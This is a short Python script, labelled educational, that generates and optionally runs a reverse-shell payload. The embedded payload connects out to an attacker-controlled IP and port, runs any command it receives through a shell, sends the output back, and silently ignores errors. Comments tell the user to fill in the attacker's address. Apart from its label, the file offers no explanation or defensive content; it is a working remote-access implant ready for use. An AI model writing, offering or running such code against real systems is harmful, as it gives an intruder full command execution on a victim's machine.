# Simple payload for reverse shell simulation (Educational Purposes Only)
import socket
import subprocess
import os

# Function to simulate payload generation
def generate_payload(file_name="reverse_shell.py"):
    payload_code = '''
import socket
import subprocess

def reverse_shell(server_ip, server_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))
        while True:
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            output = subprocess.getoutput(command)
            s.send(output.encode('utf-8'))
        s.close()
    except Exception as e:
        pass

# Change these to the attacker's IP and port
server_ip = "192.168.1.100"  # Replace with the attacker's IP
server_port = 4444  # Replace with the desired port

reverse_shell(server_ip, server_port)
    '''
    with open(file_name, 'w') as f:
        f.write(payload_code)
    print(f"Payload generated and saved as '{file_name}'")

# Function to execute the payload (for testing purposes)
def execute_payload(file_name="reverse_shell.py"):
    print(f"Executing payload '{file_name}'...")
    os.system(f"python3 {file_name}")

# Generate the payload
generate_payload()

# Optionally, execute the payload (for testing purposes only)
# execute_payload()  # Uncomment to run the payload
